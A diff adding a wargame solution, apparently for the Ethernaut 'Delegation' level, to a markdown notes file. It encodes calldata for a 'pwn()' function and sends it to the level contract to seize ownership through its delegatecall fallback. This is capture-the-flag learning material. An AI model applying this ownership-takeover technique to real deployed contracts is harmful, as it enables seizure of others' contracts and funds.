@@ -70,4 +70,17 @@ Solution
 
 ## Problem 6: Delegation
 
+- contract address: 0x344fCaCD370F420d79D5f9f6B74d86Cc1bB05383
 
+Solution
+
+- construct the calldata by:
+
+  ```ts
+  const abi = ["function pwn()"];
+  const iface = new _ethers.utils.Interface(abi);
+  let data = iface.encodeFunctionData("pwn");
+  data;
+  // display: `0xdd365b8b`
+  ```
+- send a transaction from metamask wallet to the contract address with the above data.
